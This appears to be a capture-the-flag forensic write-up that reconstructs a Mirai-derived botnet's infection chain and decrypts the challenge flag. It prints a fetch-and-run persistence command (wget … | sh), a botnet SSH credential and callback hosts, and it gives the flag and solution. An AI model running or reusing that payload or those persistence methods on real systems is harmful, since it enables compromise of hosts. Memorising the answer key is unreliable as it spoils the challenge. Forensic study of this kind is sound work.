# Evo Bot

## Challenge Description

A business network has been breached. During triage of the FortiGate IPS telemetry, the security team observes the signature callback address of the loader and repeated exploitation attempts against edge and network appliances. The artifacts point to the **Evooo1Bot** botnet — a Mirai-derived Linux malware family.

Evooo1Bot is far more than a conventional DDoS bot. It is a modular remote-administration framework that bundles persistence mechanisms, an interactive shell, a credential sniffer, a SOCKS proxy relay, an SSH brute-force scanner, and an HTTP-based CVE exploit dispatcher. Its strings are protected by a multi-layer encryption pipeline applied at compile time, and its command-and-control traffic is encrypted.

I was provided a single archive: `artifacts.tgz`. After extracting it, five stages of recovered evidence were available. Each stage unlocks the next. The goal is to reconstruct the complete infection chain and recover the final flag.

---

## Artifacts

The challenge provided a single file:

- **`artifacts.tgz`**

Extracting it yielded the following evidence:

| File | Description |
|------|-------------|
| `01_loader_wget.sh` | Recovered loader script from FortiGate IPS capture |
| `02_c2_strings.bin` | Encrypted C2 strings blob |
| `02_strings_notes.txt` | Analyst notes on string decryption |
| `03_botnet_logs.txt` | Activity / command logs |
| `03_persist.dump` | Persistence artifacts dumped from compromised host |
| `04_relay_notes.txt` | Notes on SOCKS relay / reverse proxy module |
| `04_socks_relay.pcap` | Packet capture of relayed traffic |
| `05_flag.aes` | Final encrypted flag |
| `05_flag_hint.txt` | Decryption guide for the final stage |

---

## Stage 1 — Loader (key1)

The recovered loader script (`01_loader_wget.sh`) downloads architecture-specific binaries from a hard-coded callback host and clears bash history after execution.

```sh
CB_HOST="91.92.40.118"
CB_PORT="443"
```

The notes explicitly state that the callback host is the **first chain key**.

**key1 = `91.92.40.118`**

---

## Stage 2 — C2 String Decryption (key2)

According to the analyst notes, the botnet protects strings with a multi-layer pipeline. Two 32-byte constants are embedded in the binary and combined at runtime via XOR:

```
CONST_A  = 6b65796d6174657269616c6e6f74312d77696e30306f6b
CONST_B  = 2c2d2b313c233a23092f223c2a2f342a24036a24604e0000
```

The resulting raw key material is:

```
cd2dab2be9e67afe34ef4d5527193adf3cd504fbef7725c44443b4b614852e5a
```

This 32-byte value is used directly as the AES-256-CTR key (the notes mention SHA-256, but verification against the provided known-plaintext sample confirmed the raw key is used).

Decrypting `02_c2_strings.bin` (16-byte CTR counter + ciphertext) yields:

```
ARTIFACT_03_persist.dump::SSH-credential: deploy / M1rai-Pwn-2026::honeypot-banner-list: COWRIE PARAMIKO GO KIPPO LIBSSH PARKS
```

This confirms the SSH credentials later observed in the activity logs (`deploy / M1rai-Pwn-2026`) and points to the Stage-3 artifact.

**key2 = `cd2dab2be9e67afe34ef4d5527193adf3cd504fbef7725c44443b4b614852e5a`**

---

## Stage 3 — Persistence (key3)

The activity logs show the bot receiving a `!persist` command and installing multiple persistence mechanisms. The corresponding dump (`03_persist.dump`) contains:

- A disguised systemd unit (`Apache HTTPD Cache Manager`)
- SysV init script
- Cron entry
- `/etc/profile.d` injection
- `rc.local` append

All of them ultimately execute the same payload:

```sh
wget -qO- http://144.76.99.202/b | sh
```

This string is the persistence payload used as **key3**.

**key3 = `wget -qO- http://144.76.99.202/b | sh`**

---

## Stage 4 — SOCKS Relay / Exfiltration (key4)

The botnet’s SOCKS relay module can operate in reverse mode. While most traffic is encrypted, an operator exfiltration body was captured in cleartext inside `04_socks_relay.pcap`.

Reassembling the stream between the markers:

```
__FILE_START__
filename=staged_credentials.tar.gz
stage5_key_components=key1,key2,key3,key4
relay_via=37.221.88.190:1080
staging_path=/srv/staging/
__FILE_END__
```

The `filename=` field is the Stage-4 key.

**key4 = `staged_credentials.tar.gz`**

---

## Stage 5 — Final Flag Decryption

`05_flag.aes` uses the following layout:

```
[12-byte nonce][AES-256-GCM ciphertext + tag]
```

Key derivation (from the hint):

```python
concat = key1 + key2 + key3 + key4
key    = SHA256(concat.encode())
```

Using the four recovered components:

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib

key1 = "91.92.40.118"
key2 = "cd2dab2be9e67afe34ef4d5527193adf3cd504fbef7725c44443b4b614852e5a"
key3 = "wget -qO- http://144.76.99.202/b | sh"
key4 = "staged_credentials.tar.gz"

data = open("05_flag.aes", "rb").read()
nonce, ct = data[:12], data[12:]

concat = key1 + key2 + key3 + key4
key = hashlib.sha256(concat.encode()).digest()

flag = AESGCM(key).decrypt(nonce, ct, None).decode()
print(flag)
```

---

## Flag

```
flag{evooo1bot_l0ader2string2pers1st2s0cks_p1v0t_r3c0v3r3d}
```

---

## Tools Used

- Python 3 + `cryptography` (AES-CTR / AES-GCM)
- Manual pcap inspection
- Standard Linux utilities (`file`, hex inspection)

---

## Infection Chain Summary

1. **Initial access** via architecture-aware loader pulling from `91.92.40.118`
2. **C2 communication** with encrypted strings and modular command set
3. **Persistence** installed across systemd, init, cron, profile, and rc.local
4. **Lateral movement** via SSH brute-force (`deploy:M1rai-Pwn-2026`)
5. **Exfiltration** through SOCKS reverse relay
6. **Final stage** credentials / payload staged as `staged_credentials.tar.gz`

The recovered chain fully matches the described capabilities of the Evooo1Bot family.
